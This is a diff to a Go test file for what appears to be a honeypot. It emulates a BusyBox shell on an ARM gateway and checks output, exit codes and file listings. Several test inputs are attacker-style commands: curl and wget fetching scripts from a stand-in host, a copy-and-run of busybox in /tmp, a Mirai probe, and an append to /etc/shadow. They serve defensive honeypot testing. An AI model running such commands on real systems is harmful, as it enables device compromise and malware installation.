@@ -37,8 +37,12 @@ func TestRun(t *testing.T) {
 		{"cat /tmp", "cat: read error: Is a directory\n"},
 		{"./bot", "-sh: ./bot: not found\n"},
 		{"cd /tmp; cp /bin/busybox x; ./x && echo started", "started\n"},
-		{"ls /etc", "hostname     issue.net    passwd       resolv.conf\n" + // columns as wide as the longest name + 2,
-			"hosts        os-release   profile      shadow\n"}, // filled top to bottom
+		{"ls /etc", "dropbear     hostname     issue.net    passwd       resolv.conf  shells\n" + // columns as wide as
+			"group        hosts        os-release   profile      shadow\n"}, // the longest name + 2, top to bottom
+		{"curl -O http://x/a.sh", "-sh: curl: not found\n"}, // BusyBox has no curl
+		{"enable", "-sh: enable: not found\n"},              // Mirai's probe for a vendor CLI
+		{"cat /etc/shells", "/bin/ash\n"},
+		{"grep wheel /etc/group", "wheel:x:10:root\n"},
 		{"uname -a", "Linux gateway 4.14.180 #1 SMP Thu Jun  4 12:00:00 UTC 2020 armv7l GNU/Linux\n"},
 		{"cat /proc/version", "Linux version 4.14.180 (builder@buildhost) (gcc version 8.3.0 (Buildroot 2019.05.3)) #1 SMP Thu Jun  4 12:00:00 UTC 2020\n"},
 		{"cat /etc/os-release | grep PRETTY", "PRETTY_NAME=\"Buildroot 2019.05.3\"\n"}, // a link to /usr/lib/os-release
@@ -53,16 +57,39 @@ func TestRun(t *testing.T) {
 	}
 
 	for _, tt := range tests {
-		got, _ := NewShell().Run(tt.line)
+		got, _, _ := NewShell().Run(tt.line)
 		if got != tt.want {
 			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
 		}
 	}
 }
 
+// Run returns the exit code of the last command that ran, like $? (SSH sends it to the client).
+func TestExitCodes(t *testing.T) {
+	tests := []struct {
+		line string
+		want int
+	}{
+		{"whoami", 0},
+		{"nosuchcmd", 127},
+		{"curl http://203.0.113.7/x.sh", 127},
+		{"cat /missing", 1},
+		{"wget http://203.0.113.7/x", 1},
+		{"false && echo never", 1}, // echo is skipped, so $? stays 1
+		{"nosuchcmd || true", 0},
+		{"cat /etc/hostname | grep nomatch", 1}, // a pipe's code is its last command's
+		{"", 0},
+	}
+	for _, tt := range tests {
+		if _, code, _ := NewShell().Run(tt.line); code != tt.want {
+			t.Errorf("Run(%q): exit code %d, want %d", tt.line, code, tt.want)
+		}
+	}
+}
+
 // exit ends the session: nothing after it runs.
 func TestExit(t *testing.T) {
-	out, exit := NewShell().Run("echo bye; exit; echo never-printed")
+	out, _, exit := NewShell().Run("echo bye; exit; echo never-printed")
 	if out != "bye\n" || !exit {
 		t.Errorf("got %q, exit=%v", out, exit)
 	}
@@ -86,10 +113,10 @@ func TestSessionsAreSeparate(t *testing.T) {
 	b := NewShell()
 	a.Run("cd /tmp; echo secret > x")
 
-	if out, _ := b.Run("cat /tmp/x"); out != "cat: can't open '/tmp/x': No such file or directory\n" {
+	if out, _, _ := b.Run("cat /tmp/x"); out != "cat: can't open '/tmp/x': No such file or directory\n" {
 		t.Errorf("b sees a's file: %q", out)
 	}
-	if out, _ := b.Run("pwd"); out != "/root\n" {
+	if out, _, _ := b.Run("pwd"); out != "/root\n" {
 		t.Errorf("b has a's directory: %q", out)
 	}
 }
@@ -141,11 +168,13 @@ func TestLs(t *testing.T) {
 				"drwxr-xr-x   14 root     root           280 Jun  4  2020 ..\n" +
 				"-rw-r--r--    1 root     root             5 Nov 20 10:30 .nippon\n" +
 				"drwxr-xr-x    2 root     root            40 Nov 20 10:30 d\n"},
+		{"ls -l /etc/dropbear", // a key file in Dropbear's format, 141 bytes like a real ECDSA P-256 one
+			"-rw-------    1 root     root           141 Jun  4  2020 dropbear_ecdsa_host_key\n"},
 		{"echo x >> /etc/shadow; ls -l /etc/shadow", // overwriting keeps the mode, the date changes
 			"-rw-------    1 root     root           290 Nov 20 10:30 /etc/shadow\n"},
 	}
 	for _, tt := range tests {
-		got, _ := NewShell().Run(tt.line)
+		got, _, _ := NewShell().Run(tt.line)
 		if got != tt.want {
 			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
 		}
@@ -198,7 +227,7 @@ func TestPsMatchesFiles(t *testing.T) {
 // "busybox" alone: BusyBox 1.30.1's own text, then the applets wrapped like appletlib.c does
 // (a new line when col >= 79 - (len + 2); the tab counts as 6).
 func TestBusyboxHelp(t *testing.T) {
-	out, _ := NewShell().Run("busybox")
+	out, _, _ := NewShell().Run("busybox")
 	if !strings.HasPrefix(out, "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n") {
 		t.Errorf("first line: %q", strings.SplitN(out, "\n", 2)[0])
 	}
@@ -213,7 +242,7 @@ func TestBusyboxHelp(t *testing.T) {
 
 // /proc/meminfo in the kernel's format: "Name:" padded to 16, the value in 8 columns, " kB".
 func TestMeminfo(t *testing.T) {
-	out, _ := NewShell().Run("cat /proc/meminfo")
+	out, _, _ := NewShell().Run("cat /proc/meminfo")
 	lines := strings.Split(strings.TrimSuffix(out, "\n"), "\n")
 	if len(lines) < 30 || lines[0] != "MemTotal:         124520 kB" {
 		t.Fatalf("%d lines, the first %q", len(lines), lines[0])
